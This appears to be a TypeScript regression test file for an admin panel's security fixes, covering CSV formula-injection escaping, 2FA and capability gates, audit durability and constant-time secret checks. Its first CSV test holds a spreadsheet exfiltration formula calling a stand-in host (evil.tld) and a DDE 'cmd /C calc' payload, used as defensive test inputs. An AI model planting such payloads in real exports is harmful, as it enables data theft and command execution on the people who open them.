import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

/**
 * Regression guards for the 2026-08 money-safety / authorization sweep.
 *
 * The CSV cases exercise the real functions; the rest are source contracts
 * (the actions they cover need a live session + both databases, so a
 * behavioural test would prove nothing here).
 */

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const read = (relative: string): string =>
  readFileSync(path.join(root, relative), "utf8");

async function loadExportCsv() {
  return import("../../src/lib/utils/export-csv");
}

// ── CSV formula injection ────────────────────────────────────────────────

test("escapeCsvField neutralizes spreadsheet formula prefixes", async () => {
  const { escapeCsvField } = await loadExportCsv();

  // The exfiltration payload from the finding: quoting alone does not stop
  // Excel / Sheets evaluating this, the leading quote does.
  assert.equal(
    escapeCsvField('=HYPERLINK("https://evil.tld/?d="&A2,"click")'),
    `"'=HYPERLINK(""https://evil.tld/?d=""&A2,""click"")"`,
  );
  assert.equal(escapeCsvField("+SUM(A1)"), "'+SUM(A1)");
  assert.equal(escapeCsvField("@SUM(A1)"), "'@SUM(A1)");
  assert.equal(escapeCsvField("-2+3+cmd|' /C calc'!A0"), "'-2+3+cmd|' /C calc'!A0");
  assert.equal(escapeCsvField("\tleading-tab"), "'\tleading-tab");
});

test("escapeCsvField leaves ordinary values and negative numbers alone", async () => {
  const { escapeCsvField } = await loadExportCsv();

  // Money columns must not gain a stray quote — that would turn every
  // negative total into text in the operator's spreadsheet.
  assert.equal(escapeCsvField(-1500.25), "-1500.25");
  assert.equal(escapeCsvField("-1500.25"), "-1500.25");
  assert.equal(escapeCsvField("+0.5"), "+0.5");
  assert.equal(escapeCsvField("1e6"), "1e6");
  assert.equal(escapeCsvField("player_one"), "player_one");
  assert.equal(escapeCsvField(null), "");
  assert.equal(escapeCsvField("a,b"), '"a,b"');
});

test("neutralizeCsvFormula is shared by every CSV builder", async () => {
  const { neutralizeCsvFormula } = await loadExportCsv();
  assert.equal(neutralizeCsvFormula("=1+1"), "'=1+1");
  assert.equal(neutralizeCsvFormula("-5"), "-5");

  for (const relative of [
    "src/lib/queries/users-export.ts",
    "src/lib/users-export/all-users-csv.ts",
  ]) {
    const source = read(relative);
    assert.match(
      source,
      /neutralizeCsvFormula/,
      `${relative} must route free-text cells through the shared sanitizer`,
    );
  }
});

// ── Balance adjustment invariants ────────────────────────────────────────

test("adjustBalance enforces the removal-only debit invariant server-side", () => {
  const source = read("src/app/(admin)/users/[id]/actions.ts");
  assert.match(
    source,
    /isRemovalOnlyAdjustmentCategory\(parsed\.category\) && parsed\.amount > 0/,
    "adjustBalance needs a set-driven backstop, not only per-category cases",
  );
});

test("post-commit audit writes on money actions are durable, never throwing", () => {
  const users = read("src/app/(admin)/users/[id]/actions.ts");
  const vouchers = read("src/app/(admin)/vouchers/actions.ts");
  const promo = read("src/app/(admin)/promo-codes/actions.ts");

  for (const [label, source] of [
    ["balance_adjustment", users],
    ["voucher_created", vouchers],
    ["promo_code_created", promo],
  ] as const) {
    assert.match(
      source,
      new RegExp(
        `createAdminAuditEventDurable\\([\\s\\S]{0,400}eventType: "${label}"`,
      ),
      `${label} must use the durable audit writer (money already committed)`,
    );
  }
  assert.match(
    users,
    /createAdminAuditEventDurable\([\s\S]{0,400}eventType: "manual_withdrawal_recorded"/,
  );
});

test("minted value counts against the per-admin spend cap", () => {
  const limits = read("src/lib/balance-limits.ts");
  assert.match(limits, /'voucher_created', 'promo_code_created'/);
  // A durable-fallback row must count exactly like the real audit row,
  // otherwise an ADMIN-DB hiccup erases the spend from the cap.
  assert.match(limits, /FROM admin_audit_write_failures/);
});

// ── 2FA + capability gates on value-minting actions ──────────────────────

test("voucher and promo-code creation are 2FA-gated and cap-checked", () => {
  const vouchers = read("src/app/(admin)/vouchers/actions.ts");
  const promo = read("src/app/(admin)/promo-codes/actions.ts");

  for (const source of [vouchers, promo]) {
    assert.match(source, /require2FA\(session\.userId/);
    assert.match(source, /checkBalanceAdjustmentLimit\(session\.userId/);
    assert.match(source, /totpCode: z\.string\(\)/);
  }
  // Money parsed as a cents-exact USD amount, not a bare float.
  assert.match(vouchers, /usdAmountSchema\(\{ positive: true \}\)/);
  assert.match(promo, /usdAmountSchema\(\{ positive: true \}\)/);
});

test("the client dialogs collect the second factor they now have to send", () => {
  for (const relative of [
    "src/app/(admin)/vouchers/create-dialog.tsx",
    "src/app/(admin)/promo-codes/create-button.tsx",
  ]) {
    const source = read(relative);
    assert.match(
      source,
      /from "@\/components\/step-up-field"/,
      `${relative} must render the shared StepUpField`,
    );
    assert.match(source, /totpCode/, `${relative} must send totpCode`);
  }
  // The voucher dialog must not re-introduce the bare Number() parse.
  const voucherDialog = read("src/app/(admin)/vouchers/create-dialog.tsx");
  assert.match(voucherDialog, /parseUsdAmount\(value\)/);
});

// ── Authorization gates ──────────────────────────────────────────────────

test("creator leaderboard creation is capability-gated with bounded money", () => {
  const source = read("src/app/(admin)/creators/leaderboards/actions.ts");
  const createBlock = source.slice(
    source.indexOf("export async function createLeaderboard("),
    source.indexOf("export async function approveLeaderboard("),
  );
  assert.ok(createBlock.length > 0, "createLeaderboard block not found");
  assert.match(
    createBlock,
    /requireCapability\(\s*session,\s*"__can_create_creator_deal"/,
  );
  assert.match(source, /MAX_LEADERBOARD_MONEY_USD = 1_000_000/);
  assert.doesNotMatch(source, /prize_amount_usd: z\.number\(\)\.positive\(\),/);
});

test("Cloudflare WAF whitelist read and write are capability-gated", () => {
  const source = read("src/app/(admin)/creators/cloudflare-whitelist-actions.ts");
  assert.match(source, /__can_view_creator_waf_whitelist/);
  assert.match(source, /__can_edit_creator_waf_whitelist/);

  const perms = read("src/app/(admin)/settings/roles/permissions-utils.ts");
  for (const key of [
    "__can_view_creator_waf_whitelist",
    "__can_edit_creator_waf_whitelist",
    "__can_manage_api_keys",
  ]) {
    assert.match(
      perms,
      new RegExp(`key: "${key}"`),
      `${key} must be registered so it can actually be granted`,
    );
  }
});

test("card and set mutations gate on the page key, not a bare session", () => {
  for (const relative of [
    "src/app/(admin)/cards/actions.ts",
    "src/app/(admin)/sets/actions.ts",
  ]) {
    const source = read(relative);
    assert.doesNotMatch(source, /await verifySession\(\)/);
    assert.match(source, /requirePageAccess\("\/(cards|sets)"\)/);
  }
});

test("moving balance to the vault never voids an existing time-lock", () => {
  const source = read("src/app/(admin)/users/[id]/actions.ts");
  assert.doesNotMatch(source, /unlock_at = NULL, version = version \+ 1/);
  assert.match(source, /preserved_unlock_at: preservedUnlockAt/);
});

test("cron secrets compare in constant time", () => {
  for (const relative of [
    "src/app/api/cron/warm/route.ts",
    "src/app/api/health/postgres/route.ts",
  ]) {
    const source = read(relative);
    assert.match(source, /constantTimeEqual\(auth, `Bearer \$\{secret\}`\)/);
    assert.doesNotMatch(source, /auth !== `Bearer \$\{secret\}`/);
  }
  assert.match(
    read("src/lib/security/constant-time.ts"),
    /timingSafeEqual/,
  );
});

test("the creator-hub owner bypass is actually reachable", () => {
  assert.match(
    read("src/lib/require-creator-hub-access.ts"),
    /isOwner: session\.isOwner/,
  );
});

// ── Customer scope ───────────────────────────────────────────────────────

test("dashboard wager and attribution legs share one customer scope", () => {
  const trends = read("src/lib/queries/dashboard-trend-series.ts");
  const dashboard = read("src/lib/queries/dashboard.ts");

  // The ledger legs (packs / battles / deposits) must drop creators exactly
  // like the attribution and upgrader legs already did, or `organic +
  // creatorCoded` can never equal `packs + battles`.
  assert.doesNotMatch(
    trends.slice(trends.indexOf("WITH events AS"), trends.indexOf("GROUP BY 1")),
    /role NOT IN \('admin', 'support'\)/,
  );
  const dailyChart = dashboard.slice(
    dashboard.indexOf("const cachedDailyChart"),
    dashboard.indexOf("const cachedDailyUpgrader"),
  );
  assert.ok(dailyChart.length > 0, "cachedDailyChart block not found");
  assert.doesNotMatch(dailyChart, /role NOT IN \('admin', 'support'\)/);
  assert.equal(
    dailyChart.match(/role NOT IN \('admin', 'support', 'creator'\)/g)?.length,
    2,
    "both the ledger and the fiat-refund leg must use the canonical scope",
  );
});
